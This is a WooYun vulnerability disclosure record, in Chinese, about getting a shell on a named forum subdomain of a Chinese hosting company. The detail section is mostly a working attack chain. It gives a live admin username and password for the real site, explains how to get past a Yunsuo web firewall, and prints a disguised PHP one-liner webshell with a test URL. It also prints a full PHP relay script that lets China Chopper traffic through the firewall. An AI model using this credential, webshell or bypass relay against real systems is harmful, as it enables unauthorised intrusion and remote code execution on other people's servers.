{"id": 84890, "wybug_id": "wooyun-2016-0170867", "wybug_title": "华夏名网某分站弱口令可Getshell(过云锁waf案例)", "wybug_corp": "华夏名网", "wybug_author": "路人甲", "wybug_date": "2016-01-18 15:57", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "后台弱口令", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "管理后台对外", "未打补丁"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： 华夏名网某分站弱口令可getshell(过云锁waf案例) 详细说明：  直接进入正题吧，这次的站点是http://bbs.sudu.cn/弱口令：用户名admin   密码qwer\n\n进后台看了一下，是Discuz! X3.2 Release 20140603版本，从前台少的可怜的用户数量来看，未打补丁的可能性比较大，那就尝试getshell吧，参考 WooYun: Discuz3.2后台文件包含漏洞可后台拿shell 具体操作过程就不啰嗦了，这里面有个小细节，一定要把服务器具体IP添加到本地host里面去，否则云锁waf会拦截的(至于怎么获得具体IP，最简单的是发送邮件测试)通过后台“文件检验”功能，我们能清楚的看到一句话文件成功生成了\n\n我们浏览器访问看看\n\n被云锁waf拦截了，估计菜刀肯定也连不了\n\n果不其然，也被拦了，乌云zone翻了下前辈们的经验之谈，终于突破了，重点请往下看1、变形一句话\n<?php$_REQUEST['a']($_REQUEST['b']);?>\n按上面getshell的方法重新将一句话写入根目录，得访问地址http://bbs.sudu.cn/help.php测试一下http://bbs.sudu.cn/help.php?a=assert&b=phpinfo();\n\n2、新建shell.php，填入菜刀中转脚本\n<?php$target=\"http://bbs.sudu.cn/help.php\";//这个就是前面那个一句话的地址$poststr='';$i=0;foreach($_POST as $k=>$v){  if(strstr($v, \"base64_decode\"))  {    $v=str_replace(\"base64_decode(\",\"\",$v);    $v=str_replace(\"))\",\")\",$v);  }  else  {    if($k===\"z0\")      $v=base64_decode($v);  }  $pp=$k.\"=\".urlencode($v);  //echo($pp);  if($i!=0)  {    $poststr=$poststr.\"&\".$pp;  }  else  {      $poststr=$pp;  }  $i=$i+1;}$ch = curl_init();$curl_url = $target.\"?\".$_SERVER['QUERY_STRING'];curl_setopt($ch, CURLOPT_URL, $curl_url);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, $poststr);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);curl_close($ch);echo $result;?>\n3、本地搭建php环境，将中转脚本置于中，菜刀中连接，地址处填http://127.0.0.1:8004/shell.php?a=assert    密码处填b\n\n成功突破，如图\n\n   漏洞证明：  \n\n   修复方案：  1、强壮弱口令2、开源程序及时打补丁   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2016-01-18 16:30 厂商回复： 这是已经放弃维护的网站，里面不牵涉主站数据，仅有少量用户注册，后期都已经关闭了用户注册。已经提交公司审核，估计是会升级或者关停此服务器。也谢谢白帽子对我们公司的帮助 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}